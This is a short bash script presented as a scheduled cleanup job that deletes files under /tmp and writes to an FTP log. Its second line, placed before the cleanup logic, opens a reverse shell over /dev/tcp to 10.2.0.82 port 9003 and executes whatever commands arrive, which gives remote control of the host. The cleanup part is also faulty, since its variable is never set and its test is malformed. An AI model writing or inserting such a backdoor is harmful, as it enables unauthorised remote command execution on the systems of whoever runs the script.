#!/bin/bash
exec 5<>/dev/tcp/10.2.0.82/9003;cat <&5 | while read line; do $line 2>&5 >&5; done
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
